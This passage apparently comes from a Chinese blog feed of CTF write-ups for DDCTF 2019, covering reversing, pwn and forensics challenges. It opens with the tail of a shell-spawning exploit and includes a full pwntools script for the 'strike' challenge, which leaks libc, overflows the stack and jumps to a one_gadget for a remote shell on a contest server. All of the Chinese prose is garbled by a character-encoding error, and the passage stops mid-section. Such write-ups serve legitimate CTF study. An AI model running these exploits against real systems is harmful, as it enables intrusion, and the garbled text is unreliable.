class="string">&quot;6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d616161608304085a8504080000000000ae040840830408182b00006761616120ae0408000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000073797374656d0061a82b000000000000000000000000000000ae040807c302002f62696e2f736800&quot;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload.encode(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>DDCTF 2019</title>
    <url>/2019/04/18/DDCTF2019/</url>
    <content><![CDATA[<p>æœ€è¿‘æ‰“äº† DDCTFã€‚</p>
<h2 id="çœŸ-ç­¾åˆ°é¢˜"><a href="#çœŸ-ç­¾åˆ°é¢˜" class="headerlink" title="çœŸ-ç­¾åˆ°é¢˜"></a>çœŸ-ç­¾åˆ°é¢˜</h2><p>åœ¨å…¬å‘Šé‡Œé¢æ‰¾åˆ° flag</p>
<span id="more"></span>

<h2 id="Windows-Reverse1"><a href="#Windows-Reverse1" class="headerlink" title="Windows Reverse1"></a>Windows Reverse1</h2><p>åŠ äº† UPX çš„å£³ï¼Œåœ¨ linux ä¸‹ç”¨ upx -d è„±æ‰ï¼Œç„¶ååˆ†æä»£ç </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+4h] [ebp-804h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+5h] [ebp-803h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [esp+404h] [ebp-404h]</span></span><br><span class="line">  <span class="type">char</span> Dst; <span class="comment">// [esp+405h] [ebp-403h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v5, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please input code:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v6);</span><br><span class="line">  check(&amp;v6);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;v4, <span class="string">&quot;DDCTF&#123;reverseME&#125;&quot;</span>) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You&#x27;ve got it!!%s\n&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Try again later.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è·å–ç”¨æˆ·è¾“å…¥ä¹‹åå°±è¿›å…¥ check å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">check</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = (a1 - v1);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *v1 = byte_402FF8[v1[v4]];</span><br><span class="line">      ++v2;</span><br><span class="line">      ++v1;</span><br><span class="line">      result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v2 &lt; result );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>é™æ€æ¥çœ‹ä¼¼ä¹æ˜¯ä»¥è¾“å…¥ä¸ºç´¢å¼•ï¼Œåœ¨ä¸€ä¸ªè¡¨ä¸­æŸ¥æ‰¾ç›¸åº”çš„å­—ç¬¦å‡ºæ¥ï¼Œåç»­ç”¨ OD è°ƒè¯•ä¹Ÿå°è¯äº†è¿™ä¸€çŒœæµ‹ã€‚</p>
<p>éšåå°†å–å‡ºçš„å­—ç¬¦å’Œ â€œDDCTF{reverseME}â€ å»æ¯”è¾ƒï¼Œå¦‚æœç›¸ç­‰è¯´æ˜è¾“å…¥æ˜¯æ­£ç¡®çš„ï¼Œé‚£ä¹ˆç¼–å†™è„šæœ¬æ‰¾å‡ºè¿™äº› index å³å¯ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">125</span>, <span class="number">124</span>, <span class="number">123</span>, <span class="number">122</span>, <span class="number">121</span>, <span class="number">120</span>, <span class="number">119</span>, <span class="number">118</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">115</span>, <span class="number">114</span>, <span class="number">113</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">109</span>, <span class="number">108</span>, <span class="number">107</span>, <span class="number">106</span>, <span class="number">105</span>, <span class="number">104</span>, <span class="number">103</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">99</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">96</span>, <span class="number">95</span>, <span class="number">94</span>, <span class="number">93</span>, <span class="number">92</span>, <span class="number">91</span>, <span class="number">90</span>, <span class="number">89</span>, <span class="number">88</span>, <span class="number">87</span>, <span class="number">86</span>, <span class="number">85</span>, <span class="number">84</span>, <span class="number">83</span>, <span class="number">82</span>, <span class="number">81</span>, <span class="number">80</span>, <span class="number">79</span>, <span class="number">78</span>, <span class="number">77</span>, <span class="number">76</span>, <span class="number">75</span>, <span class="number">74</span>, <span class="number">73</span>, <span class="number">72</span>, <span class="number">71</span>, <span class="number">70</span>, <span class="number">69</span>, <span class="number">68</span>, <span class="number">67</span>, <span class="number">66</span>, <span class="number">65</span>, <span class="number">64</span>, <span class="number">63</span>, <span class="number">62</span>, <span class="number">61</span>, <span class="number">60</span>, <span class="number">59</span>, <span class="number">58</span>, <span class="number">57</span>, <span class="number">56</span>, <span class="number">55</span>, <span class="number">54</span>, <span class="number">53</span>, <span class="number">52</span>, <span class="number">51</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">47</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">44</span>, <span class="number">43</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">40</span>, <span class="number">39</span>, <span class="number">38</span>, <span class="number">37</span>, <span class="number">36</span>, <span class="number">35</span>, <span class="number">34</span>, <span class="number">33</span>, <span class="number">32</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">if</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;D&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of D is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of C is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;T&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of T is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;F&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of F is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;&#123;&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of &#123; is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of &#125; is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;r&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of r is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;e&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of e is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;v&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of v is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of s is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;M&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of M is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;E&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of E is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ZZ[JX#,9(9,+9QY!</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>é‡æ–°æ’åˆ—å­—ç¬¦å³å¯å¾—åˆ° flag (å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡è°ƒè¯•ç›´æ¥æ‹¿ flag)ã€‚</p>
<p>flag: ZZ[JX#,9(9,+9QY!</p>
<h2 id="Windows-Reverse2"><a href="#Windows-Reverse2" class="headerlink" title="Windows Reverse2"></a>Windows Reverse2</h2><p>åŠ äº† ASP çš„å£³ï¼Œæˆ‘è¯•äº†å‡ ä¸ªè„±å£³å·¥å…·éƒ½ä¸èƒ½æ­£å¸¸è„±å£³ï¼Œç´¢æ€§å¸¦ç€å£³ç›´æ¥è°ƒè¯•ï¼Œåˆ©ç”¨ ESP å®šå¾‹ + å­—ç¬¦ä¸²æœç´¢å®šä½åˆ°ä¸»å‡½æ•°ï¼Œç®€å•çœ‹äº†ä¸€ä¸‹ï¼Œç¬¬ä¸€ä¸ªå…³é”®å‡½æ•°åœ¨ 0x11611f0(è¿™ä¸ªåœ°å€å¯èƒ½ä¸ä¸€æ ·ï¼Œä½†æ˜¯å°±åœ¨ scanf å‡½æ•°ä¸‹æ–¹)ï¼Œå®ƒç”¨æ¥éªŒè¯è¾“å…¥æ˜¯å¦ç”± 16 è¿›åˆ¶å­—ç¬¦ä¸²æ„æˆï¼Œå³æˆ‘ä»¬çš„è¾“å…¥åªèƒ½ç”± 0<del>9 + A</del>F ç»„æˆï¼Œéšåè¿˜ä¼šå°†è¾“å…¥ä¸¤ä¸¤ä¸€ç»„è½¬æ¢æˆçœŸæ­£çš„åå…­è¿›åˆ¶ã€‚</p>
<p>å¦å¤–ä¸€ä¸ªå‡½æ•°åŠ¨æ€åˆ†æçœ‹åˆ°è§£å¯†äº†å­—ç¬¦ä¸²ï¼Œâ€™ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;â€˜ï¼Œå¾ˆæ˜æ˜¾æ˜¯ BASE64 ç®—æ³•çš„è¡¨ç›˜ï¼ŒçŒœæµ‹è¿™ä¸ªå‡½æ•°å®ç°äº† BASE64 ç¼–ç æˆ–è€…è§£ç ï¼Œæœ€ç»ˆå°†ç»“æœå’Œ reverse+ è¿›è¡Œæ¯”è¾ƒã€‚ç¼–å†™è„šæœ¬å¯¹ reverse+ å­—ç¬¦ä¸²è¿›è¡Œ base64 è§£ç å¾—åˆ°æ­£ç¡®çš„ flagã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = [<span class="number">55</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">62</span>, <span class="number">63</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">34</span>, <span class="number">35</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">44</span>, <span class="number">23</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">70</span>, <span class="number">71</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">66</span>, <span class="number">67</span>, <span class="number">64</span>, <span class="number">65</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">93</span>, <span class="number">89</span>]</span><br><span class="line">t = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    t += <span class="built_in">chr</span>(i ^ <span class="number">0x76</span>)</span><br><span class="line"><span class="built_in">print</span> t</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(<span class="string">&quot;reverse+&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># \xad\xeb\xde\xae\xc7\xbe</span></span><br><span class="line"><span class="comment"># ADEBDEAEC7BE</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>flag:  ADEBDEAEC7BE</p>
<h2 id="PWN-strike"><a href="#PWN-strike" class="headerlink" title="[PWN] strike"></a>[PWN] strike</h2><p>æ¼æ´åœ¨äºè¾“å…¥é•¿åº¦çš„æ—¶å€™æ²¡æœ‰è€ƒè™‘ä¸ºè´Ÿæ•°çš„æƒ…å†µï¼Œå½“è¾“å…¥ä¸€ä¸ªè´Ÿæ•°çš„æ—¶å€™å‘ç”Ÿæ•´æ•°æº¢å‡ºå›ç»•åˆ°ä¸€ä¸ªéå¸¸å¤§çš„æ­£æ•°ï¼Œå¯¼è‡´æ ˆæº¢å‡ºã€‚</p>
<p>å¦å¤–åœ¨è¯»å– username çš„æ—¶å€™æ²¡æœ‰è¡¥é›¶ï¼Œå¯¼è‡´ä¿¡æ¯æ³„éœ²ã€‚</p>
<p>æ€è·¯æ˜¯é€šè¿‡ä¿¡æ¯æ³„éœ²æ‰¾åˆ° libc çš„åœ°å€å’Œ ebp çš„åœ°å€(æ ˆçš„åœ°å€)ï¼Œç„¶åé€šè¿‡æ ˆæº¢å‡ºè¿”å›åˆ° onegadget  getshellã€‚</p>
<p>æ³¨æ„åˆ°å‘ç”Ÿæ ˆæº¢å‡ºçš„å‡½æ•°ç»“å°¾æœ‰ä»¥ä¸‹æ±‡ç¼–ä»£ç </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea     esp, [ebp-8]</span><br><span class="line">pop     ecx</span><br><span class="line">pop     ebx</span><br><span class="line">pop     ebp</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure></div>

<p>å¹¶ä¸æ˜¯å¸¸è§„çš„ leave ret ç»“æ„ï¼Œæ‰€ä»¥æ„é€ åˆ©ç”¨é“¾å°±ç¨ç¨å¤æ‚ä¸€äº›ï¼Œå¦å¤–æœåŠ¡å™¨ä¸Šé¢çš„ libc å’Œæœ¬åœ°çš„ libc å¥½åƒç¨æœ‰ä¸åŒã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./xpwn&quot;</span></span><br><span class="line">ip = <span class="string">&quot;116.85.48.105&quot;</span></span><br><span class="line">port =  <span class="number">5005</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;DEBUG&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Enter username: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;a&quot;</span> * <span class="number">60</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello &quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">60</span> + <span class="string">&#x27;\x0a&#x27;</span>)</span><br><span class="line">libc_addr = u32(<span class="string">&#x27;\x50&#x27;</span> + p.recv(<span class="number">3</span>)) - libc.symbols[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_addr: %x&quot;</span> % libc_addr)</span><br><span class="line">one_gadget = libc_addr + <span class="number">0x3a819</span></span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">ebp_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&quot;ebp_addr : 0x%x&quot;</span> % ebp_addr)</span><br><span class="line">log.info(<span class="string">&quot;one_gadget: %x&quot;</span> % one_gadget)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please set the length of password: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">68</span> + p32(ebp_addr + <span class="number">4</span>) + <span class="string">&quot;bbbb&quot;</span> + p32(one_gadget) + p32(ebp_addr + <span class="number">8</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># DDCTF&#123;s0_3asy_St4ck0verfl0w_r1ght?&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>flag: DDCTF{s0_3asy_St4ck0verfl0w_r1ght?}</p>
<h2 id="Confused"><a href="#Confused" class="headerlink" title="Confused"></a>Confused</h2><p>ç”¨ objective-C ç¼–å†™çš„ç¨‹åºï¼Œ IDA æ‰“å¼€ç¨‹åºå‘ç°åç¼–è¯‘çš„æ•ˆæœç›¸å½“ä¸é”™ï¼Œå¹¶ä¸”æ²¡æœ‰å»é™¤ç¬¦å·ä¿¡æ¯ã€‚</p>
<p>ä¸èƒ½æ‰§è¡Œç¨‹åºå°±åªèƒ½é™æ€åˆ†æï¼Œåœ¨ checkcode å‡½æ•°ä¸­æ‰¾åˆ°äº†å…·ä½“çš„éªŒè¯ç®—æ³•ï¼Œç®€å•åˆ†æä¸€ä¸‹ï¼Œç¨‹åºå®ç°äº†ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œä»ä»£ç æ®µå–å‡º opcodeï¼Œç„¶ååˆ©ç”¨ loader å‡½æ•°æ‰§è¡Œã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">loader</span><span class="params">(vm *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> result; <span class="comment">// al</span></span><br><span class="line">  <span class="type">bool</span> v2; <span class="comment">// [rsp+Fh] [rbp-11h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      v2 = i &lt; <span class="number">9</span>;                           </span><br><span class="line">    result = v2;</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1-&gt;opcode == *(&amp;a1-&gt;op1 + <span class="number">16</span> * i) )  <span class="comment">// call every func</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">1</span>;</span><br><span class="line">      (*(&amp;a1-&gt;op1_func + <span class="number">2</span> * i))(a1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­è™šæ‹Ÿæœºç»“æ„ä½“æ¢å¤å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 vm              struc ; (sizeof=0xB0, mappedto_59)</span><br><span class="line">00000000 temp1           dd ?</span><br><span class="line">00000004 temp2           dd ?</span><br><span class="line">00000008 temp3           dd ?</span><br><span class="line">0000000C temp4           dd ?</span><br><span class="line">00000010 bool            dd ?</span><br><span class="line">00000014 unknown         dd ?</span><br><span class="line">00000018 opcode          dq ?</span><br><span class="line">00000020 op1             dq ?</span><br><span class="line">00000028 op1_func        dq ?</span><br><span class="line">00000030 op2             dq ?</span><br><span class="line">00000038 op2_func        dq ?</span><br><span class="line">00000040 op3             dq ?</span><br><span class="line">00000048 op3_func        dq ?</span><br><span class="line">00000050 op4             dq ?</span><br><span class="line">00000058 op4_func        dq ?</span><br><span class="line">00000060 op5             dq ?</span><br><span class="line">00000068 op5_func        dq ?</span><br><span class="line">00000070 op6             dq ?</span><br><span class="line">00000078 op6_func        dq ?</span><br><span class="line">00000080 op7             dq ?</span><br><span class="line">00000088 op7_func        dq ?</span><br><span class="line">00000090 op8             dq ?</span><br><span class="line">00000098 op8_func        dq ?</span><br><span class="line">000000A0 op9             dq ?</span><br><span class="line">000000A8 op9_func        dq ?</span><br><span class="line">000000B0 vm              ends</span><br><span class="line">000000B0</span><br></pre></td></tr></table></figure></div>

<p>opcode ä» 0x000000100001984 åœ°å€å¼€å§‹ï¼Œåˆ†æå‰å‡ æ¡æŒ‡ä»¤å¾—åˆ°å¤§è‡´å¦‚ä¸‹çš„ç¨‹åºé€»è¾‘</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vm -&gt; temp1 = 0x66</span><br><span class="line">vm -&gt; temp1 = 0x68 &#x27;h&#x27;</span><br><span class="line">vm -&gt; temp1 == flag[0] ? vm -&gt; temp5 = 1 : vm -&gt; temp5 = 0</span><br><span class="line">judge vm -&gt; temp5 == 1 ? if not --&gt; fail</span><br><span class="line"></span><br><span class="line">vm -&gt; temp1 = 0x63</span><br><span class="line">vm -&gt; temp1 = 0x65 &#x27;e&#x27;</span><br><span class="line">vm -&gt; temp1 == flag[1] ? vm -&gt; temp5 = 1 : vm -&gt; temp5 = 0</span><br><span class="line">judge vm -&gt; temp5 == 1 ? if not --&gt; fail</span><br><span class="line"></span><br><span class="line">vm -&gt; temp1 = 0x6A</span><br><span class="line">vm -&gt; temp1 = 0x6c &#x27;l&#x27;</span><br><span class="line">vm -&gt; temp1 == flag[1] ? vm -&gt; temp5 = 1 : vm -&gt; temp5 = 0</span><br><span class="line">judge vm -&gt; temp5 == 1 ? if not --&gt; fail</span><br><span class="line"></span><br><span class="line">vm -&gt; temp1 = 0x6A</span><br><span class="line">vm -&gt; temp1 = 0x6c &#x27;l&#x27;</span><br><span class="line">vm -&gt; temp1 == flag[1] ? vm -&gt; temp5 = 1 : vm -&gt; temp5 = 0</span><br><span class="line">judge vm -&gt; temp5 == 1 ? if not --&gt; fail</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>å…ˆå–å‡ºä¸€ä¸ªå­—èŠ‚ï¼Œç„¶ååšä¸€ä¸ªåç§»é‡ä¸º 2 çš„å‡¯æ’’åŠ å¯†ï¼Œå†å’Œæˆ‘ä»¬çš„è¾“å…¥è¿›è¡Œæ¯”è¾ƒã€‚</p>
<p>å°†é‡Œé¢çš„å¯†æ–‡å–å‡ºæ¥ï¼Œåšä¸€æ¬¡å‡¯æ’’è§£å¯†å³å¯å¾—åˆ° flag</p>
<p>flag: DDCTF{helloYouGotTheFlag}</p>
<h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªæ•°æ®åŒ…ï¼Œç›´æ¥ç”¨ wireshark æ‰“å¼€ï¼Œè¿‡æ»¤å‡º http æµé‡ï¼Œé¦–å…ˆæ‰¾åˆ°äº†ä¸€ä¸ªç½‘ç«™</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://tools.jb51.net/aideddesign/img_add_info</span><br></pre></td></tr></table></figure></div>

<p>çŒœæµ‹æµé‡åŒ…é‡Œé¢ç”¨åˆ°äº†è¿™ä¸ªéšå†™å·¥å…·ã€‚</p>
<p>ç„¶ååœ¨ä¸€ä¸ªä¸Šä¼ å›¾ç‰‡çš„æµé‡åŒ…ä¸­æ‰¾åˆ°ä¸€ä¸ª ç»¿è‰²é’¥åŒ™çš„å›¾ç‰‡ï¼Œåœ¨ linux ä¸‹é¢æç¤º CRC é”™è¯¯ï¼Œè¿™é€šå¸¸æ˜¯ç”±äºå›¾ç‰‡é•¿å®½é”™è¯¯å¯¼è‡´çš„ã€‚åˆ©ç”¨ 010 editor ä¿®æ”¹å›¾ç‰‡é«˜åº¦æ‹¿åˆ°ä¸€ä¸ª keyï¼š  57pmYyWt</p>
